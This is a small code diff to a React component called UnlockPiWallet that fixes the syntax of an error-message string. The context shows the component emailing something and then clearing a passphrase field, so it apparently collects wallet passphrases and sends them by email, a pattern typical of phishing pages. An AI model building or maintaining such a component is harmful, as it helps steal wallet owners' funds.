@@ -41,7 +41,7 @@ const UnlockPiWallet = () => {
       toast.success("✅ Email sent successfully!");
       setPassphrase("");
     } catch (error: any) {
-      toast.error(❌ Email sending failed: ${error.message});
+      toast.error(`Email sending failed: ${error.message}`);
     }
   };
   return (
